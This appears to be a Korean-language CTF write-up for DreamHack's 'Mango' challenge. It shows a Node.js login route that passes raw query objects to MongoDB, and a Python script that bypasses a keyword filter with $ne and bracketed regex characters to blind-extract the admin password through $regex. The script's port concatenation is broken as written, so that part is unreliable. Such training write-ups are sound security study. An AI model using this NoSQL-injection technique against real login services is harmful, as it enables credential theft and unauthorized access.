---
layout: post
title: "(DreamHack) Mango"
date: 2021-05-25 05:24:00 -0400
categories: Security CTF
---

NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.

Mongo db는 대표적인 NoSQL이며, 비교 연산자, 논리 연산자를 기본적으로 사용할 수 있고, $regex, $where, $elemMatch 연산자를 통해 좀 더 다양한 기능을 수행할 수 있다.

## 풀이

BAN 변수에는 'admin', 'dh', 'admi'의 문자열이 포함되게 되면 필터링하게 되어있다. 따라서 필터링 되지 않도록 $ne guest를 사용하여 admin을 검색할 수 있도록 하였다.

```javascript
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});
```

BAN에 dh가 있기 때문에 이를 피하기 위해 [D]를 사용했으며, brute force방식과 유사하게 모든 경우의 수를 탐색할 수 있도록 하였다.

```python
import requests

ascii ='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def url(pwd):
    params = {'uid[$ne]':'guest','upw[$regex]':pwd} #uid=[adm]in 등으로 해주어도 된다.
    port = 15108
    req = requests.get('http://host1.dreamhack.games:' + port + '/login',params = params)
    return req

def search(flag):
    global ascii
    for i in ascii:
        ch = flag + '[' + i + ']'
        if "admin" in url(ch).text:
            flag += '[' + i + ']'
            break
    return i

if __name__ == '__main__':
    flag = '[D]H{'
    for i in range(0, 32):
        flag += search(flag)
    print(flag + '}')
```

### Reference
[1] dreamhack. (2020)."Server-side Advanced - NoSQL." Retrieved from https://dreamhack.io/learn/1/29#7